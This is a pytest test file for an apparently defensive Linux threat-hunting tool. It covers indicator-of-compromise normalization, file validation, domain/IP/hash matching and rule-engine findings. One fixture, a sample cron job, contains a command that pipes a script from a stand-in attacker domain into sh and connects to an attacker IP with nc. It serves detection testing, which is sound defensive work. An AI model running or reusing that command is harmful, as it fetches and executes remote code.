import json
from pathlib import Path
from typing import Any

import pytest

from linux_threat_hunter.ioc import IocError, load_iocs
from linux_threat_hunter.ioc.matcher import normalize
from linux_threat_hunter.rules_engine import Engine

SHA = "a" * 64


def write(tmp_path: Path, indicators: dict[str, Any], **extra: Any) -> Path:
    p = tmp_path / "iocs.json"
    p.write_text(json.dumps({"schema_version": 1, "indicators": indicators, **extra}))
    return p


def test_normalization() -> None:
    assert normalize("sha256", SHA.upper()) == SHA
    assert normalize("ip", "2001:0DB8:0:0:0:0:0:1") == "2001:db8::1"
    assert normalize("domain", "Evil.Example.TEST.") == "evil.example.test"
    assert normalize("file_path", "/tmp//a/../b") == "/tmp/b"
    assert normalize("process_name", "updater") == "updater"


@pytest.mark.parametrize(
    ("kind", "value"),
    [
        ("sha256", "xyz"),
        ("sha256", "a" * 63),
        ("ip", "999.1.1.1"),
        ("domain", "no_dots"),
        ("domain", "bad domain.com"),
        ("file_path", "relative/path"),
        ("process_name", "/bin/sh"),
    ],
)
def test_invalid_indicators_rejected(kind: str, value: str) -> None:
    from linux_threat_hunter.ioc.matcher import IocError as E

    with pytest.raises(E):
        normalize(kind, value)


def test_file_validation(tmp_path: Path, config: dict[str, Any]) -> None:
    lim = config["limits"]
    bad = tmp_path / "bad.json"
    bad.write_text("{nope")
    with pytest.raises(IocError):
        load_iocs(bad, lim)
    bad.write_text(json.dumps({"schema_version": 2}))
    with pytest.raises(IocError):
        load_iocs(bad, lim)
    with pytest.raises(IocError):
        load_iocs(write(tmp_path, {"urls": ["http://x"]}), lim)
    with pytest.raises(IocError):
        load_iocs(write(tmp_path, {"ips": [{"value": "1.2.3.4", "severity": "apocalyptic"}]}), lim)
    with pytest.raises(IocError):
        load_iocs(write(tmp_path, {"ips": [123]}), lim)
    with pytest.raises(IocError):
        load_iocs(write(tmp_path, {}, options={"regex": True}), lim)
    with pytest.raises(IocError):
        load_iocs(tmp_path / "missing.json", lim)
    yml = tmp_path / "i.yaml"
    yml.write_text("schema_version: 1\nindicators:\n  ips: ['203.0.113.9']\n")
    assert load_iocs(yml, lim).counts["ip"] == 1


def test_exact_matching_only_by_default(tmp_path: Path, config: dict[str, Any]) -> None:
    iocs = load_iocs(
        write(tmp_path, {"domains": ["evil.example.test"], "ips": ["203.0.113.5"], "process_names": ["updater"]}),
        config["limits"],
    )
    m = iocs.match_record
    assert m("network", {"remote_host": "evil.example.test"})
    assert m("network", {"remote_host": "EVIL.example.test."})  # normalized
    assert not m("network", {"remote_host": "notevil.example.test"})
    assert not m("network", {"remote_host": "sub.evil.example.test"})  # broader matching is opt-in
    assert not m("network", {"remote_addr": "203.0.113.50"}) and m("network", {"remote_addr": "203.0.113.5"})
    assert not m("process", {"name": "updater2"}) and m("process", {"name": "updater"})


def test_subdomain_matching_is_explicit(tmp_path: Path, config: dict[str, Any]) -> None:
    iocs = load_iocs(
        write(tmp_path, {"domains": ["evil.example.test"]}, options={"match_subdomains": True}), config["limits"]
    )
    hit = iocs.match_record("network", {"remote_host": "a.b.evil.example.test"})
    assert hit and hit[0]["match_mode"] == "normalized/subdomain"
    assert not iocs.match_record("network", {"remote_host": "example.test"})


def test_persistence_command_tokens(tmp_path: Path, config: dict[str, Any]) -> None:
    iocs = load_iocs(write(tmp_path, {"domains": ["evil.example.test"], "ips": ["203.0.113.5"]}), config["limits"])
    rec = {
        "kind": "cron_job",
        "path": "/etc/cron.d/x",
        "commands_text": "curl -s http://evil.example.test/a.sh | sh; nc 203.0.113.5 80",
    }
    kinds = {x["indicator_type"] for x in iocs.match_record("persistence", rec)}
    assert kinds == {"domain", "ip"}
    # substring of a longer hostname must not match
    assert not iocs.match_record(
        "persistence", {"kind": "cron_job", "commands_text": "curl http://xevil.example.test/"}
    )


def test_ioc_finding_has_indicator_source_and_evidence(
    make_evidence: Any, rules: list[Any], config: dict[str, Any], tmp_path: Path
) -> None:
    iocs = load_iocs(
        write(tmp_path, {"sha256": [{"value": SHA, "description": "synthetic", "severity": "critical"}]}),
        config["limits"],
    )
    ev = make_evidence(
        processes=[{"pid": 5, "ppid": 1, "name": "x", "exe": "/usr/bin/x", "sha256": SHA, "user": "u", "cmdline": "x"}]
    )
    res = Engine(rules, config, iocs).run(ev)
    f = next(f for f in res.findings if f.rule_id == "LTH-PROC-002")
    assert f.classification == "ioc_match" and f.severity == "critical"  # IOC-provided severity
    assert f.ioc_matches[0]["indicator"] == SHA and f.ioc_matches[0]["matched_field"] == "sha256"
    assert f.evidence_source == "processes.json" and f.evidence["record_ref"] == "processes.json#0"
    assert "not" in f.rationale.lower() and "confirm" in f.rationale.lower()
